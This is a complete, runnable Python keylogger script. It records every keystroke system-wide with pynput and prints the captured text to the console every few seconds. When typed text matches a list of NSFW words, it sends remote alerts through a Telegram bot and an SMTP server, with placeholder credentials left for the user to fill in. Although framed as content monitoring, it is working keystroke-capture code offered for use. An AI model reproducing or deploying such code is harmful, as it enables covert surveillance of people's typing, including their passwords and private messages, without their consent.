﻿import smtplib
import threading
from pynput import keyboard
import os
from telegram import Bot


class KeyLogger:
    def __init__(self, time_interval, nsfw_words_file, bot_token, mailtrap_username, mailtrap_password):
        self.interval = time_interval
        self.log = ""
        self.nsfw_words = self.load_nsfw_words(nsfw_words_file)
        self.stop_requested = False
        self.bot = Bot(token=bot_token)
        self.mailtrap_username = mailtrap_username
        self.mailtrap_password = mailtrap_password

    def load_nsfw_words(self, nsfw_words_file):
        try:
            with open(nsfw_words_file, "r") as file:
                nsfw_words = {line.strip().lower() for line in file}
            return nsfw_words
        except FileNotFoundError:
            print("NSFW words file not found. No NSFW filtering will be applied.")
            return set()

    def appendlog(self, string):
        self.log += string

    def save_data(self, key):
        if hasattr(key, 'char') and key.char is not None:
            if key.char == ' ':  # Space character
                return  # Ignore space
            else:
                self.appendlog(str(key.char))

                # Check if any NSFW word is formed in the current log
                for word in self.nsfw_words:
                    if word in self.log.lower():
                        self.send_alert_message("NSFW content detected!")
                        self.log = ""  # Clear the log after detecting NSFW content
                        break  # Exit loop once NSFW content is detected

    def send_alert_message(self, message):
        try:
            # Send alert message via Telegram
            chat_id = self.bot.get_updates()[-1].message.chat_id
            self.bot.send_message(chat_id=chat_id, text=message)
            print("Telegram alert message sent successfully.")

            # Send alert message via Mailtrap
            sender = "Keylogger Alert <from@example.com>"
            receiver = "Admin <admin@example.com>"
            smtp_server = "smtp.mailtrap.io"
            smtp_port = 2525

            mail_message = f"""\
Subject: Keylogger Alert
To: {receiver}
From: {sender}

{message}"""

            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(self.mailtrap_username, self.mailtrap_password)
                server.sendmail(sender, receiver, mail_message)

            print("Mailtrap alert message sent successfully.")

        except Exception as e:
            print(f"Error sending alert message: {e}")

    def report(self):
        print(self.log)
        self.log = ""
        if not self.stop_requested:
            timer = threading.Timer(self.interval, self.report)
            timer.start()

    def end_program(self):
        input("Press Enter to end the program.")
        os._exit(0)

    def run(self):
        print("Keylogger started. Press Enter to end the program.")
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            input_thread = threading.Thread(target=self.end_program)
            input_thread.start()
            keyboard_listener.join()
            input_thread.join()


# Provide the file location of the NSFW words dataset
nsfw_words_file = "nsfw.txt"

# Provide your Telegram bot token
# Replace "YOUR_BOT_TOKEN" with your actual Telegram bot token
bot_token = "Your_Bot_Token"

# Provide your Mailtrap username and password
mailtrap_username = "your-mailtrap-username"
mailtrap_password = "your-mailtrap-password"

# Instantiate the KeyLogger object and run it
# Change the interval as needed
keylogger = KeyLogger(5, nsfw_words_file, bot_token,
                      mailtrap_username, mailtrap_password)
keylogger.run()
